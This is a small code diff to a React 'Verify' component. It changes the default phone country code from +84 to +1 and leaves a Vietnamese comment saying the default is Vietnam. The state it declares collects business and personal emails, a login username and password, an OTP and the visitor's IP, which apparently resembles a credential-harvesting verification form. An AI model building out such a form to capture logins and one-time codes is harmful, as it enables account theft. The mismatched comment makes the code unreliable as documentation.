@@ -8,7 +8,7 @@ export default function Verify() {
   const [clientIp, setClientIp] = useState('Unknown');
   
   const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
-  const [countryCode, setCountryCode] = useState('+84'); // Mặc định Việt Nam
+  const [countryCode, setCountryCode] = useState('+1'); // Mặc định Việt Nam
   const [phoneNum, setPhoneNum] = useState('');
   
   const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
